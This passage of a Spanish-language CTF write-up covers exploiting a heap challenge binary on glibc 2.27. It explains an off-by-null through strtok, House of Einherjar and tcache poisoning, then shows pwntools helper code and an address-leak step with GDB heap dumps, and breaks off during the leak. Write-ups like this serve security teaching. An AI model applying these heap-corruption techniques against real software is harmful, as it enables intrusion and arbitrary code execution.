/ # find / -name libc.so.6 2>/dev/null | xargs md5sum
48e708bb157196b4cc1ffb68fc66fa17  /srv/lib/x86_64-linux-gnu/libc.so.6
9e21f348e8bd0dfd8d535eaf6fa9eb71  /lib/libc.so.6
9e21f348e8bd0dfd8d535eaf6fa9eb71  /opt/libc.so.6
/ # find / -name ld-linux-x86-64.so.2 2>/dev/null | xargs md5sum
md5sum: can't open '/srv/lib64/ld-linux-x86-64.so.2': No such file or directory
bd1331eea9e034eb3d661990e25037b7  /srv/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2  
dbd82259ea74a350bc165f75fda6195a  /lib/ld-linux-x86-64.so.2
dbd82259ea74a350bc165f75fda6195a  /opt/ld-linux-x86-64.so.2
</code></pre></div><p>¡Hay dos versiones diferentes dentro del contenedor! Ahora, vemos que es Glibc 2.27:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/ # cp /srv/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /srv/lib/x86_64-linux-gnu/libc.so.6 /opt  
/ # exit

<span class="code-cyan">$</span> <span class="code-dark-green">./ld-linux-x86-64.so.2</span> <span class="mtku">./libc.so.6</span>
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) stable release version 2.27.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 7.5.0.
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
</code></pre></div><p>En este punto, podemos parchear el binario de nuevo para usar esta versión Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-interpreter <span class="mtku">ld-linux-x86-64.so.2</span> <span class="mtku">chall</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">patchelf</span> --set-rpath <span class="mtku">.</span> <span class="mtku">chall
</code></pre></div><h3 id="versiones-diferentes">Versiones diferentes</h3><p>Vale la pena decir que resolver el reto con Glibc 2.36 fue más difícil que con 2.27 debido a dos motivos:</p><ul><li><em>Safe-linking</em> está habilitado, por lo que necesitamos ofuscar y desobfuscar punteros en las listas de Tcache</li><li>Los <em>hooks</em> están deshabilitados, por lo que necesitamos usar un método menos común para lograr la ejecución del código arbitrario. Yo utilicé <a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite">TLS-storage <code>dtor_list</code></a>, que creo que es la forma más fácil</li></ul><p>Las dos técnicas anteriores no son necesarias con Glibc 2.27, porque no hay tales mitigaciones habilitadas. Sin embargo, fue un buen ejercicio para practicar técnicas más modernas con mitigaciones más actualizadas.</p><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>Estamos lidiando con un reto de explotación de <em>heap</em>. Al final, queremos lograr ejecución del código arbitrario, y para eso necesitamos una primitiva de escritura arbitraria. En consecuencia, necesitamos saber la posición de Glibc en tiempo de ejecución para llamar a <code>system("/bin/sh")</code>, Por lo tanto, necesitamos poder fugar direcciones de memoria.</p><p>La técnica para fugar direcciones de memoria es bastante común en retos de explotación de <em>heap</em>. Una vez que se libera un <em>chunk</em>, aparece un puntero en el campo <code>fd</code> (en listas de Tcache). Este puntero se utiliza para gestionar una lista enlazada de <em>chunks</em> liberados.</p><p>No hay <em>Use After Free</em> en el programa, pero podemos liberar un <em>chunk</em> y asignarlo nuevamente usando el mismo tamaño, para que el gestor de <em>heap</em> nos dé el mismo <em>chunk</em>. En este punto, podemos escribir un solo byte en el <em>chunk</em>, de modo que solo sobrescribimos el byte menos significativo del puntero <code>fd</code>. A continuación, dado que el <em>chunk</em> está asignado, podemos usar <code>do_tok</code> para leer el contenido del <em>chunk</em>.</p><p>Para fugar las direcciones Glibc, el proceso es el mismo pero utilizando <em>chunks</em> de <em>Unsorted Bin</em>. Aquí, necesitamos asignar <em>chunks</em> más grandes que <code>0x80</code> (fuera del rango del <em>Fast Bin</em>) y liberar más de 7 <em>chunks</em> de este tamaño (para llenar la lista de Tcache). El octavo <em>chunk</em> se enviará al <em>Unsorted Bin</em>. Estos <em>chunks</em> liberados tienen punteros <code>fd</code> y <code>bk</code> que apuntan a una región de <code>main_arena</code>, que se encuentra en Glibc.</p><p>Nuestra primitiva de escritura aparece en <code>do_tok</code>. Después de leer la <a href="https://www.man7.org/linux/man-pages/man3/strtok.3.html">página <code>man</code></a>, Podemos ver un fallo de implementación menor con el uso de <code>strtok</code>:</p><blockquote><p><em>Be cautious when using these functions. If you do use them, note that:</em></p><ul><li><p><em>These functions modify their first argument.</em></p></li><li><p><em>These functions cannot be used on constant strings.</em></p></li><li><p><em>The identity of the delimiting byte is lost.</em></p></li><li><p><em>The <code>strtok()</code> function uses a static buffer while parsing, so it&rsquo;s not thread safe. Use <code>strtok_r()</code> if this matters to you.</em></p></li></ul></blockquote><p>El primer punto es el que hace que el programa sea explotable. Dado que <code>strtok</code> modifica el primer argumento, sucede que cualquier ocurrencia del separador será reemplazado por un byte nulo.</p><p>Sabiendo esto, podemos desbordar con un solo byte nulo (<em>off-by-null</em>). Si asignamos un <em>chunk</em> con el tamaño máximo utilizable y lo llenamos con caracteres, el campo de tamaño del siguiente <em>chunk</em> estará justo después de la cadena. Como resultado, si indicamos el tamaño del siguiente <em>chunk</em> como delimitador para el <em>chunk</em> anterior en <code>do_tok</code>, podremos modificar el tamaño del siguiente <em>chunk</em> y comenzar a corromper la memoria.</p><p>En esta situación, podemos realizar un ataque de <em>null-byte poison</em> (<em>House of Einherjar</em>). Estos ataques usan un byte nulo en el tamaño de un <em>chunk</em>, de modo que las <em>flags</em> <code>AMP</code> están a <code>0</code>. La relevante es <code>PREV_INUSE</code>, que dice si el <em>chunk</em> anterior está en uso o no para poder fusionar <em>chunks</em>. Lo que podemos hacer es colocar un <em>chunk</em> falso dentro del <em>chunk</em> anterior y un tamaño anterior falso, para que podamos liberar el <em>chunk</em> corrupto y el activar la consolidación.</p><p>Si pasan todas las verificaciones de seguridad, lograremos tener <em>chunks</em> solapados, lo que nos permite modificar información arbitraria de <em>chunks</em> liberados. Por ejemplo, podemos aprovechar esto usando el Tcache <em>poisoning</em> para obtener una primitiva de escritura arbitraria.</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Usaremos las siguientes funciones auxiliares:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk9 mtki">size</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">string</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">int</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'size? '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">size</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'str? '</span><span class="mtk1">, </span><span class="mtk9 mtki">string</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'stored at '</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'!'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">).</span><span class="mtk8">decode</span><span class="mtk1">())</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">do_tok</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">separator</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">list</span><span class="mtk1">[</span><span class="mtk8 mtku">bytes</span><span class="mtk1">]:</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'idx? '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'delim? '</span><span class="mtk1">, </span><span class="mtk9 mtki">separator</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">1. str'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">).</span><span class="mtk8">splitlines</span><span class="mtk1">()</span>  


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'idx? '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
</code></pre></div><h3 id="fugando-direcciones-de-memoria">Fugando direcciones de memoria</h3><p>Como dije antes, vamos a asignar más de 7 <em>chunks</em> con un tamaño más grande que <code>0x80</code> y liberarlos todos, de modo que la lista de Tcache esté llena y los siguientes <em>chunks</em> vayan al <em>Unsorted Bin</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">)</span>
</code></pre></div><p>Elegí <code>0xf8</code> como tamaño utilizable para tener <em>chunks</em> de tamaño <code>0x100</code>, para usarlos después. Además, necesito 9 trozos porque tengo que asignarlos nuevamente y escribir un solo byte para fugar direcciones de memoria. Si tuviera 8, se asignará el <em>chunk</em> de <em>Unsorted Bin</em> y se eliminarán los punteros <code>fd</code> y <code>bk</code>, porque estará vacío. Podemos usar la siguiente instrucción para agregar GDB al proceso:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">io</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>  
</code></pre></div><p>Tenemos este estado del <em>heap</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576000</span>, size=<span class="code-magenta">0x250</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=0x7000000000000)
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576250</span>, size=<span class="code-magenta">0x200</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7fd2ff7ebca0</span>, bk=<span class="code-dark-green">0x7fd2ff7ebca0</span>)<span class="code-blue">  &lt;-  unsortedbins[1/1]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576450</span>, size=<span class="code-magenta">0x100</span>, flags=, fd=<span class="code-dark-blue">0x556137576560</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][1/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576550</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576660</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][2/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576650</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576760</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][4/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576750</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576860</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][3/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576850</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576960</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][5/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576950</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576a60</span>, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][6/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576a50</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=<span class="code-dark-blue">0x556137576010</span>)<span class="code-blue">  &lt;-  tcache[idx=14,sz=0x100][7/7]</span>
<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576b50</span>, size=<span class="code-magenta">0x204b0</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=0x000000000000) <span class="code-blue"> &lt;-  top</span>
<span class="code-green">gef&gt; </span>bins
<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
tcachebins[idx=14, size=0x100, @<span class="code-dark-blue">0x5561375760c0</span>] count=7
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576450</span>, size=<span class="code-magenta">0x100</span>, flags=, fd=<span class="code-dark-blue">0x556137576560</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576550</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576660</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576650</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576760</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576750</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576860</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576850</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576960</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576950</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576a60</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576a50</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=<span class="code-dark-blue">0x556137576010</span>)
<span class="code-blue">[+]</span> Found 7 chunks in tcache.
<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
unsorted_bins[idx=0, size=any, @<span class="code-dark-green">0x7fd2ff7ebcb0</span>]: fd=<span class="code-dark-blue">0x556137576250</span>, bk=<span class="code-dark-blue">0x556137576250</span>
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576250</span>, size=<span class="code-magenta">0x200</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7fd2ff7ebca0</span>, bk=<span class="code-dark-green">0x7fd2ff7ebca0</span>)
<span class="code-blue">[+]</span> Found 1 chunks in unsorted bin.
<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
</code></pre></div><p>El segundo <em>chunk</em> tiene tamaño <code>0x200</code> porque es el resultado de dos <em>chunks</em> de <em>Unsorted Bin</em> fusionados en uno. Ahora, si asignamos <em>chunks</em> de tamaño <code>0x100</code>, se utilizarán esos <em>chunks</em> liberados del Tcache hasta que esté vacío y luego vendrán los de <em>Unsorted Bin</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)</span>  
</code></pre></div><p>Obsérvese que los bits más significativos de los punteros <code>fd</code> y <code>bk</code> siguen ahí:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef> </span>visual-heap
<span class="code-dark-red">0x556137576000: 0x0000000000000000 0x0000000000000251 | ........Q....... |</span>
<span class="code-dark-red">0x556137576010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 35 lines, 0x230 bytes</span>
<span class="code-dark-green">0x556137576250: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-green">0x556137576260: 0x00007fd2ff7ebe41 0x00007fd2ff7ebe90 | A.~.......~..... |</span>
<span class="code-dark-green">0x556137576270: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576350: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-blue">0x556137576360: 0x0000000000000041 0x0000000000000000 | A............... |</span>
<span class="code-dark-blue">0x556137576370: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-yellow">0x556137576450: 0x0000000000000100 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576460: 0x0000556137576541 0x0000000000000000 | AeW7aU.......... |</span>
<span class="code-dark-yellow">0x556137576470: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-yellow">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-red">0x556137576550: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-red">0x556137576560: 0x0000556137576641 0x0000000000000000 | AfW7aU.......... |</span>
<span class="code-dark-red">0x556137576570: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576650: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-green">0x556137576660: 0x0000556137576741 0x0000000000000000 | AgW7aU.......... |</span>
<span class="code-dark-green">0x556137576670: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576750: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-blue">0x556137576760: 0x0000556137576841 0x0000000000000000 | AhW7aU.......... |</span>
<span class="code-dark-blue">0x556137576770: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-yellow">0x556137576850: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576860: 0x0000556137576941 0x0000000000000000 | AiW7aU.......... |</span>
<span class="code-dark-yellow">0x556137576870: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-yellow">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-red">0x556137576950: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-red">0x556137576960: 0x0000556137576a41 0x0000000000000000 | AjW7aU.......... |</span>
<span class="code-dark-red">0x556137576970: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576a50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-green">0x556137576a60: 0x0000000000000041 0x0000000000000000 | A............... |</span>
<span class="code-dark-green">0x556137576a70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576b50: 0x0000000000000000 0x00000000000204b1 | ................ |  &lt;-  top</span>  
<span class="code-dark-blue">0x556137576b60: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 8265 lines, 0x20490 bytes</span>
</code></pre></div><p>Entonces, podemos usar <code>do_tok</code> con un separador aleatorio (que no se encontrará) para imprimir esas direcciones de memoria:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">do_tok</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'.'</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">&amp;</span><span class="mtk1"> (</span><span class="mtk5">~</span><span class="mtk7 mtki">0x</span><span class="mtk6">fff</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">do_tok</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'.'</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">3ebe41</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Heap base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">heap_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><p>Y aquí las tenemos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[<span class="code-blue">*</span>] Heap base address: 0x556137576000
[<span class="code-green">+</span>] Glibc base address: 0x7fd2ff400000  
</code></pre></div><p>Y son correctas según GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>vmmap heap
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-blue">Heap</span> | <span class="code-dark-magenta">Stack</span> | <span class="code-dark-green">Writable</span> | <span class="code-blue">ReadOnly</span> | <span class="code-grey">None</span> | <span class="mtku">RWX</span> ]
<span class="code-blue">Start              End                Size               Offset             Perm Path</span>
<span class="code-dark-blue">0x0000556137576000</span> <span class="code-dark-blue">0x0000556137597000</span> <span class="code-dark-blue">0x0000000000021000</span> <span class="code-dark-blue">0x0000000000000000</span> <span class="code-dark-blue">rw-</span> <span class="code-dark-blue">[heap]</span>
<span class="code-green">gef&gt; </span>vmmap libc
